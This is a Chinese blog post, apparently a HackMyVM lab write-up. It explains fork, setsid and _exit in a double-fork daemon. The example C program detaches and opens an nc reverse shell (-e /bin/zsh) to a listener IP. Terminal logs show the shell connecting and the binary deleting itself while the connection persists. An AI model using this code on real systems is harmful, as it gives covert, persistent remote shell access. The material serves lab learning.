---
title: "C 语言守护进程持久化连接"
date: 2026-04-26T12:05:19+08:00
draft: false
description: "Sysadmin 靶机中用到的 C 语言守护进程持久化技巧"
categories: ["靶机复盘"]
tags: ["HackMyVM", "Easy"]
---
## fork

- fork() 用来创建一个**子进程**
- 调用一次，返回两次：
  - 在父进程里返回：**子进程的 PID**
  - 在子进程里返回：**0**
  - 失败返回：**-1**

你可以把它理解成：

- 原来只有 1 个进程
- 调用 fork() 后，变成 **父进程 + 子进程**
- 两边都会从 fork() 后面那一行继续往下执行

**fork 正常的用途：**

- 父进程继续做自己的事
- 子进程去做另一件事
- 很多服务端程序、守护进程、shell 都会这样干

**fork 非正常用途：**

场景：程序运行后立马删除，为了持久化连接，使用守护进程技术（双分支 + setsid）成功实现持久连接：

```c
int fork(void);
int system(const char *command);
void _exit(int status);
int setsid(void);

int main(void){
    //
    int pid = fork();
    if (pid != 0) return 0;
    setsid();
    pid = fork();
    if (pid != 0) _exit(0);
    //
    // 这部分为守护进程持久化代码的核心
    return system("nc 192.168.174.130 39666 -e /bin/zsh");
}
```

疑问回答：为什么第二个`if`用`_exit(0)`，而不用`return 0`退出？

**先只理解 fork() 做了什么**

fork() 会复制出一个新进程。

复制出来以后：

- 父进程继续跑
- 子进程也从同一个地方继续跑
- 子进程会继承父进程当前很多“内存里的状态”

这里的“状态”里，就包括：

- printf 还没真正写出去的内容（缓冲区）
- atexit(...) 登记过的“退出时要做的事”

------

**什么叫“缓冲区被继承”**

看这个例子：

```
printf("hello"); fork(); exit(0); 
```

注意："hello" 后面**没有换行**，所以它可能还只是放在内存缓冲区里，**还没真正显示出来**。

如果这时 fork()：

- 父进程内存里有一份 "hello"
- 子进程也复制到一份 "hello"

然后父子都 exit(0)：

- 父进程刷一次缓冲区，输出一个 hello
- 子进程也刷一次缓冲区，又输出一个 hello

结果你可能看到：

```
hellohello 
```

这就是“**重复刷新**”。

------

**atexit 也类似**

比如程序里提前登记了：

```
atexit(cleanup); 
```

那么正常 exit(0) 时会执行 cleanup()。

fork() 之后，子进程也继承了这个登记。

如果子进程这时也走 exit(0)，那么：

- 父进程退出时执行一次 cleanup
- 子进程退出时也执行一次 cleanup

但这个清理动作本来可能只想让原进程做一次。
子进程再做一遍，可能就不合适。

------

**所以 _exit(0) 的作用是什么**

_exit(0) 不会去：

- 刷新 stdio 缓冲区
- 调用 atexit 回调

它就是：

- 这个子进程任务结束
- 直接内核级退出
- 不碰那些“继承来的收尾工作”

所以在 fork() 之后，如果某个子进程只是个“临时中间进程”，通常就用 _exit(0)。

**放回你这段代码里理解**

第二次 fork() 后：

```
pid = fork(); if (pid != 0) _exit(0); 
```

这里 pid != 0 的这个进程，是“第二次 fork 的父进程”，也就是那个**中间子进程**。
它的作用只是：

- 帮你再 fork 一次
- 然后自己赶紧退出

既然它只是个“过渡角色”，就不应该再做完整的用户态清理，所以用 _exit(0)。

```sh
#终端1：
warn@kali:/tmp/123$ gcc shell.c -o shell
#编译
#终端2：
warn@kali:~$ nc -lvnp 39666 
listening on [any] 39666 ...
#监听
#终端1
warn@kali:/tmp/123$ ./shell 
#终端2：
warn@kali:~$ nc -lvnp 39666 
listening on [any] 39666 ...
connect to [192.168.174.130] from (UNKNOWN) [192.168.174.130] 59510
id
uid=1000(warn) gid=1000(warn) groups=1000(warn),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),116(bluetooth),121(lpadmin),124(wireshark),132(kaboxer)
echo $SHELL
/usr/bin/zsh
```

这可能还不能体现出上面稳定的功能：

```sh
# 终端1
warn@kali:/tmp/123$ cat shell.sh 
#!/bin/zsh

./shell

rm -rf ./shell
# 终端2
warn@kali:~$ nc -lvnp 39666
listening on [any] 39666 ...
# 终端1
warn@kali:/tmp/123$ zsh shell.sh       
warn@kali:/tmp/123$ ls -al
total 8
drwxrwxr-x  2 warn warn  80 Apr 26 10:55 .
drwxrwxrwt 13 root root 320 Apr 26 10:49 ..
-rw-rw-r--  1 warn warn 279 Apr 26 10:49 shell.c
-rw-rw-r--  1 warn warn  36 Apr 26 10:55 shell.sh
warn@kali:/tmp/123$ ps -aux | grep shell
warn        3444  0.0  0.0   2428   732 ?        S    10:55   0:00 ./shell
warn        3711  0.0  0.0   9628  2380 pts/0    S+   11:02   0:00 grep --color=auto shell
# 终端2
warn@kali:~$ nc -lvnp 39666
listening on [any] 39666 ...
connect to [192.168.174.130] from (UNKNOWN) [192.168.174.130] 35824
id
uid=1000(warn) gid=1000(warn) groups=1000(warn),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),116(bluetooth),121(lpadmin),124(wireshark),132(kaboxer)
```

从这一步可以看到，即使执行完`./shell` 并删除后，进程里面依然存在./shell进程，连接还存在。
